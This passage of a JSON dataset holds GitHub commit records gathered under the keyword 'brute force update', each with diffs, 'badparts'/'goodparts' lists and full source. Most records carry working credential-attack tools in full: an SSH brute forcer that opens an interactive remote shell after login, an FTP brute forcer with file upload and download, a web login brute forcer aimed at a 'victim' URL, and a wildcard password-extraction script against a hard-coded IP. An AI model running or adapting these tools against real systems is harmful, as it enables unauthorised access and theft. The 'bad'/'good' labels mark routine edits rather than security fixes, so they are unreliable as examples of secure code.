input('Insert a command to execute on the server:\\t')\n                        stdin, stdout, stderr = ssh_session.exec_command(command)\n                        print(stdout.read().decode())\n                        print(stderr.read().decode())\n                        end = input('Do you want to finish y\/n?\\t').lower()[0]\n                        if end == 'y':\n                            break\n                except Exception as e:\n                    print(e)\n                \n# GLITCH422\n"}},"msg":"Update SSH_Brute_Force.py"},"3e928201c7dc5c115f4c53d52d79f26e1f7b19f8":{"url":"https:\/\/api.github.com\/repos\/glitch422\/Python-Tools\/commits\/3e928201c7dc5c115f4c53d52d79f26e1f7b19f8","html_url":"https:\/\/github.com\/glitch422\/Python-Tools\/commit\/3e928201c7dc5c115f4c53d52d79f26e1f7b19f8","sha":"3e928201c7dc5c115f4c53d52d79f26e1f7b19f8","keyword":"brute force update","diff":"diff --git a\/Web_Brute_Force.py b\/Web_Brute_Force.py\nindex 3744f52..a6e8845 100644\n--- a\/Web_Brute_Force.py\n+++ b\/Web_Brute_Force.py\n@@ -19,6 +19,6 @@\n                     print(f'Login failed: {u} {p}')\n                 else:\n                     print(f'The login is success: {u} {p}')\n-                    break\n+                    \n                     \n    # GLITCH422\n","message":"","files":{"\/Web_Brute_Force.py":{"changes":[{"diff":"\n                     print(f'Login failed: {u} {p}')\n                 else:\n                     print(f'The login is success: {u} {p}')\n-                    break\n+                    \n                     \n    # GLITCH422\n","add":1,"remove":1,"filename":"\/Web_Brute_Force.py","badparts":["                    break"],"goodparts":[]}],"source":"\nimport requests url=input('Please enter your url victim:\\t') email=input('Please enter the user list file(name of the file or the path):\\t') password=input('Please enter the password list(name of the file or path):\\t') with open(email,'r') as userlist: for u in userlist: u=''.join(u.split(\"\\n\")) with open(password, 'r') as passlist: for p in passlist: p=''.join(p.split(\"\\n\")) data_payload={ 'email': u, 'password': p, 'RememberMe': 'false' } site=requests.post(f'{url}', data=data_payload) text=site.text if \"The email or password provided is incorrect\" in text: print(f'Login failed:{u}{p}') else: print(f'The login is success:{u}{p}') break ","sourceWithComments":"import requests\nurl = input('Please enter your url victim:\\t')\nemail = input('Please enter the user list file (name of the file or the path):\\t')\npassword = input('Please enter the password list (name of the file or path):\\t')\nwith open(email,'r') as userlist:\n    for u in userlist:\n        u = ''.join(u.split(\"\\n\"))\n        with open(password, 'r') as passlist:\n            for p in passlist:\n                p = ''.join(p.split(\"\\n\"))\n                data_payload = {\n                    'email': u,\n                    'password': p,\n                    'RememberMe': 'false'\n                }\n                site = requests.post(f'{url}', data=data_payload)\n                text = site.text\n                if \"The email or password provided is incorrect\" in text:\n                    print(f'Login failed: {u} {p}')\n                else:\n                    print(f'The login is success: {u} {p}')\n                    break\n                    \n   # GLITCH422\n"}},"msg":"Update Web_Brute_Force.py"},"6de9df77c6463f5c81601ef9f01e038009da61c6":{"url":"https:\/\/api.github.com\/repos\/glitch422\/Python-Tools\/commits\/6de9df77c6463f5c81601ef9f01e038009da61c6","html_url":"https:\/\/github.com\/glitch422\/Python-Tools\/commit\/6de9df77c6463f5c81601ef9f01e038009da61c6","sha":"6de9df77c6463f5c81601ef9f01e038009da61c6","keyword":"brute force update","diff":"diff --git a\/SSH_Brute_Force.py b\/SSH_Brute_Force.py\nindex 1749dd6..9fb0171 100644\n--- a\/SSH_Brute_Force.py\n+++ b\/SSH_Brute_Force.py\n@@ -13,8 +13,8 @@\n                 try:\n                     ssh_session = paramiko.SSHClient()\n                     ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)\n-                    ssh_session.connect(ip, port, username, password)\n-                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n+                    ssh_session.connect(ip, port, u, p)\n+                    print(f'Login success!\\nUsername: {u} , Password: {p}')\n                     while True:\n                         command = input('Insert a command to execute on the server:\\t')\n                         stdin, stdout, stderr = ssh_session.exec_command(command)\n","message":"","files":{"\/SSH_Brute_Force.py":{"changes":[{"diff":"\n                 try:\n                     ssh_session = paramiko.SSHClient()\n                     ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)\n-                    ssh_session.connect(ip, port, username, password)\n-                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n+                    ssh_session.connect(ip, port, u, p)\n+                    print(f'Login success!\\nUsername: {u} , Password: {p}')\n                     while True:\n                         command = input('Insert a command to execute on the server:\\t')\n                         stdin, stdout, stderr = ssh_session.exec_command(command)\n","add":2,"remove":2,"filename":"\/SSH_Brute_Force.py","badparts":["                    ssh_session.connect(ip, port, username, password)","                    print(f'Login success!\\nUsername: {username} , Password: {password}')"],"goodparts":["                    ssh_session.connect(ip, port, u, p)","                    print(f'Login success!\\nUsername: {u} , Password: {p}')"]}],"source":"\nimport paramiko username=input('Please insert the user name list:\\t') password=input('Please insert the password list:\\t') ip=input(\"Please insert the IP address to communication:\\t\") port=22 with open(username, 'r') as userlist: for u in userlist: u=''.join(u.split(\"\\n\")) with open(password, 'r') as passlist: for p in passlist: p=''.join(p.split(\"\\n\")) try: ssh_session=paramiko.SSHClient() ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy) ssh_session.connect(ip, port, username, password) print(f'Login success!\\nUsername:{username}, Password:{password}') while True: command=input('Insert a command to execute on the server:\\t') stdin, stdout, stderr=ssh_session.exec_command(command) print(stdout.read().decode()) print(stderr.read().decode()) end=input('Do you want to finish y\/n?\\t').lower()[0] if end=='y': break except Exception as e: print(e) ","sourceWithComments":"import paramiko\n\nusername = input('Please insert the user name list:\\t')\npassword = input('Please insert the password list:\\t')\nip = input(\"Please insert the IP address to communication:\\t\")\nport = 22\nwith open(username, 'r') as userlist:\n    for u in userlist:\n        u = ''.join(u.split(\"\\n\"))\n        with open(password, 'r') as passlist:\n            for p in passlist:\n                p = ''.join(p.split(\"\\n\"))\n                try:\n                    ssh_session = paramiko.SSHClient()\n                    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)\n                    ssh_session.connect(ip, port, username, password)\n                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n                    while True:\n                        command = input('Insert a command to execute on the server:\\t')\n                        stdin, stdout, stderr = ssh_session.exec_command(command)\n                        print(stdout.read().decode())\n                        print(stderr.read().decode())\n                        end = input('Do you want to finish y\/n?\\t').lower()[0]\n                        if end == 'y':\n                            break\n                except Exception as e:\n                    print(e)\n                \n# GLITCH422\n"}},"msg":"Update SSH_Brute_Force.py"},"c3b7e5f9d89796cd4e7ed7f2a2a3a3695f1a82e5":{"url":"https:\/\/api.github.com\/repos\/glitch422\/Python-Tools\/commits\/c3b7e5f9d89796cd4e7ed7f2a2a3a3695f1a82e5","html_url":"https:\/\/github.com\/glitch422\/Python-Tools\/commit\/c3b7e5f9d89796cd4e7ed7f2a2a3a3695f1a82e5","sha":"c3b7e5f9d89796cd4e7ed7f2a2a3a3695f1a82e5","keyword":"brute force update","diff":"diff --git a\/FTP_Brute_Force.py b\/FTP_Brute_Force.py\nindex 9f73d61..ddf6419 100644\n--- a\/FTP_Brute_Force.py\n+++ b\/FTP_Brute_Force.py\n@@ -13,8 +13,8 @@\n                 try:\n                     session = ftplib.FTP()\n                     session.connect(f'{ip}',21)\n-                    session.login(username, p)\n-                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n+                    session.login(u, p)\n+                    print(f'Login success!\\nUsername: {u} , Password: {p}')\n                     print('=====================================================')\n                     while True:\n                         command = input('Please choose the command (dir, pwd, get, put, cwd, or exit to close):\\t').lower()\n@@ -65,6 +65,6 @@\n                              else:\n                                  continue\n                 except ftplib.error_perm:\n-                    print(f'Wrong Credentials\\n Username:{username} , Password:{p}')\n+                    print(f'Wrong Credentials\\n Username:{u} , Password:{p}')\n      \n      # GLITCH422\n","message":"","files":{"\/FTP_Brute_Force.py":{"changes":[{"diff":"\n                 try:\n                     session = ftplib.FTP()\n                     session.connect(f'{ip}',21)\n-                    session.login(username, p)\n-                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n+                    session.login(u, p)\n+                    print(f'Login success!\\nUsername: {u} , Password: {p}')\n                     print('=====================================================')\n                     while True:\n                         command = input('Please choose the command (dir, pwd, get, put, cwd, or exit to close):\\t').lower()\n","add":2,"remove":2,"filename":"\/FTP_Brute_Force.py","badparts":["                    session.login(username, p)","                    print(f'Login success!\\nUsername: {username} , Password: {password}')"],"goodparts":["                    session.login(u, p)","                    print(f'Login success!\\nUsername: {u} , Password: {p}')"]},{"diff":"                              else:\n                                  continue\n                 except ftplib.error_perm:\n-                    print(f'Wrong Credentials\\n Username:{username} , Password:{p}')\n+                    print(f'Wrong Credentials\\n Username:{u} , Password:{p}')\n      \n      # GLITCH422\n","add":1,"remove":1,"filename":"\/FTP_Brute_Force.py","badparts":["                    print(f'Wrong Credentials\\n Username:{username} , Password:{p}')"],"goodparts":["                    print(f'Wrong Credentials\\n Username:{u} , Password:{p}')"]}],"source":"\nimport ftplib import socket ip=input('Insert IP address for connection:\\t') username=input('Enter user list:\\t') password=input('Enter password list:\\t') with open(username, 'r') as user_list: for u in user_list: u=''.join(u.split('\\n')) with open(password,'r') as password_list: for p in password_list: p=''.join(p.split(\"\\n\")) try: session=ftplib.FTP() session.connect(f'{ip}',21) session.login(username, p) print(f'Login success!\\nUsername:{username}, Password:{password}') print('=====================================================') while True: command=input('Please choose the command(dir, pwd, get, put, cwd, or exit to close):\\t').lower() if command==\"pwd\": print('================================================================') print(f'The working directory is ------->{session.pwd()}\\n') print('=====================================================') elif command=='dir': print('================================================================') print('The files of the directory is:\\n') session.dir() print('=======================================================') elif command==\"put\": print('================================================================') file_upload=input('Enter the file that you would like to upload:\\t') put_file=open(file_upload, 'rb') file_up_name=input('How would you like save the file in the server?\\t') session.storbinary(f'stor{file_up_name}', put_file) put_file.close() print('==========================================================') elif command=='get': print('================================================================') session.dir() file_download=input('Choose the file you want to download from the server:\\t') get_file=open(file_download, 'wb') file_down_name=input('How would you like save the file in your computer?\\t') session.retrbinary(f'retr{file_down_name}', get_file.write) get_file.close() print('================================================================') elif command=='cwd': print('================================================================') print(f'The working directory is ------->{session.pwd()}\\n') change_directory=input('Which directory would you like to go to?\\t') session.cwd(change_directory) print(f'The working directory is ------->{session.pwd()}\\n') print('================================================================') elif command==exit: print('The session is closed...') session.close() break else: print(\"Wrong Command...\") ask=input('Would you like to exit y\/n?\\t').lower()[0] if ask=='y': print('The session is closed...') session.close() break else: continue except ftplib.error_perm: print(f'Wrong Credentials\\n Username:{username}, Password:{p}') ","sourceWithComments":"import ftplib\nimport socket\n\nip = input('Insert IP address for connection:\\t')\nusername = input('Enter user list:\\t')\npassword = input('Enter password list:\\t')\nwith open(username, 'r') as user_list:\n    for u in user_list:\n        u = ''.join(u.split('\\n'))\n        with open(password,'r') as password_list:\n            for p in password_list:\n                p = ''.join(p.split(\"\\n\"))\n                try:\n                    session = ftplib.FTP()\n                    session.connect(f'{ip}',21)\n                    session.login(username, p)\n                    print(f'Login success!\\nUsername: {username} , Password: {password}')\n                    print('=====================================================')\n                    while True:\n                        command = input('Please choose the command (dir, pwd, get, put, cwd, or exit to close):\\t').lower()\n                        if command == \"pwd\":\n                            print('================================================================')\n                            print(f'The working directory is -------> {session.pwd()}\\n')\n                            print('=====================================================')\n                        elif command == 'dir':\n                            print('================================================================')\n                            print('The files of the directory is:\\n')\n                            session.dir()\n                            print('=======================================================')\n                        elif command == \"put\":\n                            print('================================================================')\n                            file_upload = input('Enter the file that you would like to upload:\\t')\n                            put_file = open(file_upload, 'rb')\n                            file_up_name = input('How would you like save the file in the server?\\t')\n                            session.storbinary(f'stor {file_up_name}', put_file)\n                            put_file.close()\n                            print('==========================================================')\n                        elif command == 'get':\n                            print('================================================================')\n                            session.dir()\n                            file_download = input('Choose the file you want to download from the server:\\t')\n                            get_file = open(file_download, 'wb')\n                            file_down_name = input('How would you like save the file in your computer?\\t')\n                            session.retrbinary(f'retr {file_down_name}', get_file.write) #\n                            get_file.close()\n                            print('================================================================')\n                        elif command == 'cwd':\n                            print('================================================================')\n                            print(f'The working directory is -------> {session.pwd()}\\n')\n                            change_directory = input('Which directory would you like to go to?\\t')\n                            session.cwd(change_directory)\n                            print(f'The working directory is -------> {session.pwd()}\\n')\n                            print('================================================================')\n                        elif command == exit:\n                            print('The session is closed ...')\n                            session.close()\n                            break\n                        else:\n                             print(\"Wrong Command ...\")\n                             ask = input('Would you like to exit y\/n?\\t').lower()[0]\n                             if ask == 'y':\n                                 print('The session is closed ...')\n                                 session.close()\n                                 break\n                             else:\n                                 continue\n                except ftplib.error_perm:\n                    print(f'Wrong Credentials\\n Username:{username} , Password:{p}')\n     \n     # GLITCH422\n"}},"msg":"Update FTP_Brute_Force.py"}},"https:\/\/github.com\/ExsoKamabay\/accounts-brute-forces":{"62d67b42c0412521cc42b14e16f14874af734fff":{"url":"https:\/\/api.github.com\/repos\/ExsoKamabay\/accounts-brute-forces\/commits\/62d67b42c0412521cc42b14e16f14874af734fff","html_url":"https:\/\/github.com\/ExsoKamabay\/accounts-brute-forces\/commit\/62d67b42c0412521cc42b14e16f14874af734fff","message":"Update accounts_brute_force.py","sha":"62d67b42c0412521cc42b14e16f14874af734fff","keyword":"brute force update","diff":"diff --git a\/accounts_brute_force.py b\/accounts_brute_force.py\nindex 1e27c03..e6f309c 100644\n--- a\/accounts_brute_force.py\n+++ b\/accounts_brute_force.py\n@@ -1,5 +1,4 @@\n from cracks import main;\n-from beautify import Beautify as bf;\n \n 'Accounts Brute Force Method!'\n if __name__ == '__main__':\n","files":{"\/accounts_brute_force.py":{"changes":[{"diff":"\n from cracks import main;\n-from beautify import Beautify as bf;\n \n 'Accounts Brute Force Method!'\n if __name__ == '__main__':\n","add":0,"remove":1,"filename":"\/accounts_brute_force.py","badparts":["from beautify import Beautify as bf;"],"goodparts":[]}],"source":"\nfrom cracks import main; from beautify import Beautify as bf; 'Accounts Brute Force Method!' if __name__=='__main__': main(); ","sourceWithComments":"from cracks import main;\nfrom beautify import Beautify as bf;\n\n'Accounts Brute Force Method!'\nif __name__ == '__main__':\n    main();\n"}},"msg":"Update accounts_brute_force.py"}},"https:\/\/github.com\/thomvar\/keepasscli":{"753825a6e7cca8cbdf60a01f6fddb5db4cf3d3ab":{"url":"https:\/\/api.github.com\/repos\/thomvar\/keepasscli\/commits\/753825a6e7cca8cbdf60a01f6fddb5db4cf3d3ab","html_url":"https:\/\/github.com\/thomvar\/keepasscli\/commit\/753825a6e7cca8cbdf60a01f6fddb5db4cf3d3ab","message":"Update documentation of `load_database`\n\nRemove previsous comment about brute-force and re-tries.","sha":"753825a6e7cca8cbdf60a01f6fddb5db4cf3d3ab","keyword":"brute force update","diff":"diff --git a\/keepass.py b\/keepass.py\nindex 4ff771d..c4e4c02 100644\n--- a\/keepass.py\n+++ b\/keepass.py\n@@ -37,8 +37,7 @@ def ask_for_file():\n \n \n def load_databases(file_name: str, new: bool=False) -> PyKeePass:\n-    \"\"\"Create or return the existing database. `try_again` opens up for brute-force attacks,\n-    will use the 3-second rule between retries.\"\"\"\n+    \"\"\"Create or return the existing database.\"\"\"\n     try_again = 0\n     while try_again < 3:\n         password = getpass(\"Database password: \")\n","files":{"\/keepass.py":{"changes":[{"diff":"\n \n \n def load_databases(file_name: str, new: bool=False) -> PyKeePass:\n-    \"\"\"Create or return the existing database. `try_again` opens up for brute-force attacks,\n-    will use the 3-second rule between retries.\"\"\"\n+    \"\"\"Create or return the existing database.\"\"\"\n     try_again = 0\n     while try_again < 3:\n         password = getpass(\"Database password: \")\n","add":1,"remove":2,"filename":"\/keepass.py","badparts":["    \"\"\"Create or return the existing database. `try_again` opens up for brute-force attacks,","    will use the 3-second rule between retries.\"\"\""],"goodparts":["    \"\"\"Create or return the existing database.\"\"\""]}],"source":"\nfrom argparse import ArgumentParser, Namespace from getpass import getpass from os.path import dirname, isfile from time import sleep from pykeepass import PyKeePass, create_database from pykeepass.exceptions import CredentialsError from pykeepass.group import Group from pykeepass.entry import Entry def get_arguments() -> Namespace: \"\"\"Parse the user input.\"\"\" def validate_arguments(parser: ArgumentParser) -> Namespace: \"\"\"Try to ensure that we can work with the user input.\"\"\" def test_path(file_name): return arguments.new or isfile(file_name) or isfile(dirname(__file__) +file_name) def ask_for_file(): file_name=input(\"What file do you want to open? \") if not test_path(file_name): return file_name arguments=parser.parse_args() while not arguments.file: parser.parse_args(args=[\"--file\", ask_for_file()], namespace=arguments) while not test_path(arguments.file): print(f\"{arguments.file} not found on the system\") parser.parse_args(args=[\"--file\", ask_for_file()], namespace=arguments) return arguments parser=ArgumentParser(description=\"Read KeePassX databases\") parser.add_argument(\"-f\", \"--file\", type=str, help=\"File to open\") parser.add_argument(\"-n\", \"--new\", action=\"store_true\") return validate_arguments(parser) def load_databases(file_name: str, new: bool=False) -> PyKeePass: \"\"\"Create or return the existing database. `try_again` opens up for brute-force attacks, will use the 3-second rule between retries.\"\"\" try_again=0 while try_again < 3: password=getpass(\"Database password: \") if new: return create_database(file_name, password=password) try: return PyKeePass(file_name, password=password) except CredentialsError: try_again +=1 def make_selection(options, quit: bool=True, back: bool=False): \"\"\"Use a list to make a selection. Add `quit` to give the user the option to exit the application. Use `back` to move back to a previous selection(if applicable).\"\"\" number_of_selections=len(options) last_option=number_of_selections for index, option in enumerate(options): print(index +1, option, sep=\". \") if back: number_of_selections +=1 print(number_of_selections, \"Back\", sep=\". \") if quit: last_option=number_of_selections +1 print(number_of_selections +1, \"Quit\", sep=\". \") selection=None while not isinstance(selection, int) or 0 > selection > number_of_selections: try: selection=int(input(f\"Select option[1-{last_option}]:\")) except ValueError: pass else: try: if selection < 1: raise IndentationError return options[selection-1] except IndexError: if back and selection==number_of_selections: return None elif quit and selection==last_option: exit() def get_group(database: PyKeePass) -> Group: \"\"\"List all groups and help the user select one of them.\"\"\" print(\"Select a group:\") return make_selection(database.groups) def get_entry(group: Group) -> Entry: \"\"\"List all entries in `group` and help the user select one.\"\"\" print(\"Select an entry:\") return make_selection(group.entries, back=True) def get_entry_data(entry: Entry): \"\"\"Naively print some of the entry data.\"\"\" print(f\"Data for{entry.title}\") print(entry.url, entry.password, sep=\"\\n\") print(\"-\"*10) return make_selection([], back=True) def workflow() -> bool: \"\"\"Basic actions to perform on the database.\"\"\" group=get_group(dbx) entry=get_entry(group) while not entry: group=get_group(dbx) entry=get_entry(group) return not get_entry_data(entry) if __name__==\"__main__\": arguments=get_arguments() dbx=load_databases(arguments.file, arguments.new) while workflow(): pass ","sourceWithComments":"from argparse import ArgumentParser, Namespace\nfrom getpass import getpass\nfrom os.path import dirname, isfile\nfrom time import sleep\nfrom pykeepass import PyKeePass, create_database\nfrom pykeepass.exceptions import CredentialsError\nfrom pykeepass.group import Group\nfrom pykeepass.entry import Entry\n\n\ndef get_arguments() -> Namespace:\n    \"\"\"Parse the user input.\"\"\"\n\n    def validate_arguments(parser: ArgumentParser) -> Namespace:\n        \"\"\"Try to ensure that we can work with the user input.\"\"\"\n\n        def test_path(file_name):\n            return arguments.new or isfile(file_name) or isfile(dirname(__file__) + file_name)\n\n        def ask_for_file():\n            file_name = input(\"What file do you want to open? \")\n            if not test_path(file_name):\n                return file_name\n\n        arguments = parser.parse_args()\n        while not arguments.file:\n            parser.parse_args(args=[\"--file\", ask_for_file()], namespace=arguments)\n        while not test_path(arguments.file):\n            print(f\"{arguments.file} not found on the system\")\n            parser.parse_args(args=[\"--file\", ask_for_file()], namespace=arguments)\n        return arguments\n\n    parser = ArgumentParser(description=\"Read KeePassX databases\")\n    parser.add_argument(\"-f\", \"--file\", type=str, help=\"File to open\")\n    parser.add_argument(\"-n\", \"--new\", action=\"store_true\")\n    return validate_arguments(parser)\n\n\ndef load_databases(file_name: str, new: bool=False) -> PyKeePass:\n    \"\"\"Create or return the existing database. `try_again` opens up for brute-force attacks,\n    will use the 3-second rule between retries.\"\"\"\n    try_again = 0\n    while try_again < 3:\n        password = getpass(\"Database password: \")\n        if new:\n            return create_database(file_name, password=password)\n        try:\n            return PyKeePass(file_name, password=password)\n        except CredentialsError:\n            try_again += 1\n\n\ndef make_selection(options, quit: bool=True, back: bool=False):\n    \"\"\"Use a list to make a selection. Add `quit` to give the user the option to exit the\n    application. Use `back` to move back to a previous selection (if applicable).\"\"\"\n    number_of_selections = len(options)\n    last_option = number_of_selections\n    for index, option in enumerate(options):\n        print(index + 1, option, sep=\". \")\n    if back:\n        number_of_selections += 1\n        print(number_of_selections, \"Back\", sep=\". \")\n    if quit:\n        last_option = number_of_selections + 1\n        print(number_of_selections + 1, \"Quit\", sep=\". \")\n    selection = None\n    while not isinstance(selection, int) or 0 > selection > number_of_selections:\n        try:\n            selection = int(input(f\"Select option [1-{last_option}]:\"))\n        except ValueError:\n            pass\n        else:\n            try:\n                # This is just to prevent negative numbers. Allowing it is a nice Easter egg\n                # but it might confuse non technical users.\n                if selection < 1:\n                    raise IndentationError\n                return options[selection-1]\n            except IndexError:\n                if back and selection == number_of_selections:\n                    return None\n                elif quit and selection == last_option:\n                    exit()\n\n\ndef get_group(database: PyKeePass) -> Group:\n    \"\"\"List all groups and help the user select one of them.\"\"\"\n    print(\"Select a group:\")\n    return make_selection(database.groups)\n\n\ndef get_entry(group: Group) -> Entry:\n    \"\"\"List all entries in `group` and help the user select one.\"\"\"\n    print(\"Select an entry:\")\n    return make_selection(group.entries, back=True)\n\n\ndef get_entry_data(entry: Entry):\n    \"\"\"Naively print some of the entry data.\"\"\"\n    print(f\"Data for {entry.title}\")\n    print(entry.url, entry.password, sep=\"\\n\")\n    print(\"-\"*10)\n    return make_selection([], back=True)\n\n\ndef workflow() -> bool:\n    \"\"\"Basic actions to perform on the database.\"\"\"\n    group = get_group(dbx)\n    entry = get_entry(group)\n    while not entry:\n        group = get_group(dbx)\n        entry = get_entry(group)\n    return not get_entry_data(entry)\n\n\nif __name__ == \"__main__\":\n    arguments = get_arguments()\n    dbx = load_databases(arguments.file, arguments.new)\n    while workflow():\n        pass\n"}},"msg":"Update documentation of `load_database`\n\nRemove previsous comment about brute-force and re-tries."}},"https:\/\/github.com\/Adrish-dev-dl\/Web-sec":{"af509fb01ebf692c56b333d9181f17cd39c9cc5a":{"url":"https:\/\/api.github.com\/repos\/Adrish-dev-dl\/Web-sec\/commits\/af509fb01ebf692c56b333d9181f17cd39c9cc5a","html_url":"https:\/\/github.com\/Adrish-dev-dl\/Web-sec\/commit\/af509fb01ebf692c56b333d9181f17cd39c9cc5a","sha":"af509fb01ebf692c56b333d9181f17cd39c9cc5a","keyword":"brute force update","diff":"diff --git a\/Brute_force.py b\/Brute_force.py\nindex 7d0f43f..51de7ba 100644\n--- a\/Brute_force.py\n+++ b\/Brute_force.py\n@@ -7,12 +7,12 @@\n '1','2','3','4','5','6',\r\n '7','8','9','0','!','\"','#','$','%','&',\"'\",'(',')','+',',','-',\r\n '.','\/',':',';','<','=','>','?','@','[',']','^','_','~','`',\r\n-'{','|','}']\r\n+'{','|','}'] # Creating character list\r\n \r\n url='http:\/\/159.65.92.13:31319\/login'\r\n-data_sent={'username':'Reese','password':'stranger things'}\r\n+data_sent={'username':'Reese','password':'stranger things'} #Data to be sent. Can include tokens if possible\r\n result=''\r\n-\r\n+#This part can be edited. For the current code below any valid user \/ password character along with '*' can be used to login the portal for whhich the logic is written.\r\n flag=1\r\n while flag==1:\r\n     flag=0\r\n@@ -24,4 +24,4 @@\n             result+=ch\r\n             print(result)\r\n             break\r\n-print('Gotcha!!')\n\\ No newline at end of file\n+print('Gotcha!!')\r\n","message":"","files":{"\/Brute_force.py":{"changes":[{"diff":"\n '1','2','3','4','5','6',\r\n '7','8','9','0','!','\"','#','$','%','&',\"'\",'(',')','+',',','-',\r\n '.','\/',':',';','<','=','>','?','@','[',']','^','_','~','`',\r\n-'{','|','}']\r\n+'{','|','}'] # Creating character list\r\n \r\n url='http:\/\/159.65.92.13:31319\/login'\r\n-data_sent={'username':'Reese','password':'stranger things'}\r\n+data_sent={'username':'Reese','password':'stranger things'} #Data to be sent. Can include tokens if possible\r\n result=''\r\n-\r\n+#This part can be edited. For the current code below any valid user \/ password character along with '*' can be used to login the portal for whhich the logic is written.\r\n flag=1\r\n while flag==1:\r\n     flag=0\r\n","add":3,"remove":3,"filename":"\/Brute_force.py","badparts":["'{','|','}']\r","data_sent={'username':'Reese','password':'stranger things'}\r","\r"],"goodparts":["'{','|','}'] # Creating character list\r","data_sent={'username':'Reese','password':'stranger things'} #Data to be sent. Can include tokens if possible\r"]},{"diff":"             result+=ch\r\n             print(result)\r\n             break\r\n-print('Gotcha!!')\n\\ No newline at end of file\n+print('Gotcha!!')\r\n","add":1,"remove":1,"filename":"\/Brute_force.py","badparts":["print('Gotcha!!')"],"goodparts":["print('Gotcha!!')\r"]}],"source":"\nimport requests\r list_char=['a','b','c','d','e','f','g','h','i','j','k',\r 'l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\r 'A','B',\r 'C','D','E','F','G','H','I','J','K','L','M','N','O','P'\r ,'Q','R','S','T','U','V','W','X','Y','Z',\r '1','2','3','4','5','6',\r '7','8','9','0','!','\"',' '.','\/',':',';','<','=','>','?','@','[',']','^','_','~','`',\r '{','|','}']\r \r url='http:\/\/159.65.92.13:31319\/login'\r data_sent={'username':'Reese','password':'stranger things'}\r result=''\r \r flag=1\r while flag==1:\r flag=0\r for ch in list_char:\r data_sent['password']=result+ch+'*'\r response=requests.post(url,data=data_sent)\r if('No search results' in response.text):\r flag=1\r result+=ch\r print(result)\r break\r print('Gotcha!!') ","sourceWithComments":"import requests\r\nlist_char=['a','b','c','d','e','f','g','h','i','j','k',\r\n'l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\r\n'A','B',\r\n'C','D','E','F','G','H','I','J','K','L','M','N','O','P'\r\n,'Q','R','S','T','U','V','W','X','Y','Z',\r\n'1','2','3','4','5','6',\r\n'7','8','9','0','!','\"','#','$','%','&',\"'\",'(',')','+',',','-',\r\n'.','\/',':',';','<','=','>','?','@','[',']','^','_','~','`',\r\n'{','|','}']\r\n\r\nurl='http:\/\/159.65.92.13:31319\/login'\r\ndata_sent={'username':'Reese','password':'stranger things'}\r\nresult=''\r\n\r\nflag=1\r\nwhile flag==1:\r\n    flag=0\r\n    for ch in list_char:\r\n        data_sent['password']=result+ch+'*'\r\n        response=requests.post(url,data=data_sent)\r\n        if('No search results' in response.text):\r\n            flag=1\r\n            result+=ch\r\n            print(result)\r\n            break\r\nprint('Gotcha!!')"}},"msg":"Update Brute_force.py\n\nAdded comments"}},"https:\/\/github.com\/newbietofx\/Python-Crack-Password":{"b5d68cb1747f395cfe39d3775f23362bf3ede308":{"url":"https:\/\/api.github.com\/repos\/newbietofx\/Python-Crack-Password\/commits\/b5d68cb1747f395cfe39d3775f23362bf3ede308","html_url":"https:\/\/github.com\/newbietofx\/Python-Crack-Password\/commit\/b5d68cb1747f395cfe39d3775f23362bf3ede308","sha":"b5d68cb1747f395cfe39d3775f23362bf3ede308","keyword":"brute force update","diff":"diff --git a\/Crack_Password_Brute_Force.py b\/Crack_Password_Brute_Force.py\nindex 027c34f..ad79465 100644\n--- a\/Crack_Password_Brute_Force.py\n+++ b\/Crack_Password_Brute_Force.py\n@@ -1,7 +1,7 @@\n import random\n-import string\n+import time\n \n-#Courtesy of https:\/\/github.com\/MustafaTheCoder\n+#courtesy of https:\/\/github.com\/MustafaTheCoder\n \n def split(word):\n     return list(word)\n@@ -10,12 +10,21 @@ def split(word):\n guess_password = \"\"\n chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\"\n \n-password = input(\"Enter Password: \")\n \n+password = input(\"Enter Password: \")\n+# store starting time\n+begin = time.time()\n+  \n+# program body starts\n while keep_going:\n     guess_password = random.choices(split(chars), k=len(password))\n     print(\"<============\"+ str(guess_password) +\"============>\")\n     \n     if guess_password == list(password):\n \t    print(\"Cracked Password: \" + \"\".join(guess_password))\n+\t    time.sleep(1)\n+\t    # store end time\n+\t    end = time.time()\n+\t    # total time taken\n+\t    print(f\"Total runtime of the program is {end - begin} s\")\n \t    keep_going = False\n","message":"","files":{"\/Crack_Password_Brute_Force.py":{"changes":[{"diff":"\n import random\n-import string\n+import time\n \n-#Courtesy of https:\/\/github.com\/MustafaTheCoder\n+#courtesy of https:\/\/github.com\/MustafaTheCoder\n \n def split(word):\n     return list(word)\n","add":2,"remove":2,"filename":"\/Crack_Password_Brute_Force.py","badparts":["import string"],"goodparts":["import time"]},{"diff":"\n guess_password = \"\"\n chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\"\n \n-password = input(\"Enter Password: \")\n \n+password = input(\"Enter Password: \")\n+# store starting time\n+begin = time.time()\n+  \n+# program body starts\n while keep_going:\n     guess_password = random.choices(split(chars), k=len(password))\n     print(\"<============\"+ str(guess_password) +\"============>\")\n     \n     if guess_password == list(password):\n \t    print(\"Cracked Password: \" + \"\".join(guess_password))\n+\t    time.sleep(1)\n+\t    # store end time\n+\t    end = time.time()\n+\t    # total time taken\n+\t    print(f\"Total runtime of the program is {end - begin} s\")\n \t    keep_going = False\n","add":10,"remove":1,"filename":"\/Crack_Password_Brute_Force.py","badparts":["password = input(\"Enter Password: \")"],"goodparts":["password = input(\"Enter Password: \")","begin = time.time()","\t    time.sleep(1)","\t    end = time.time()","\t    print(f\"Total runtime of the program is {end - begin} s\")"]}],"source":"\nimport random import string def split(word): return list(word) keep_going=True guess_password=\"\" chars=\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!$%&'()*+,-.\/:;<=>?@[\\]^_`{|}~\" password=input(\"Enter Password: \") while keep_going: guess_password=random.choices(split(chars), k=len(password)) 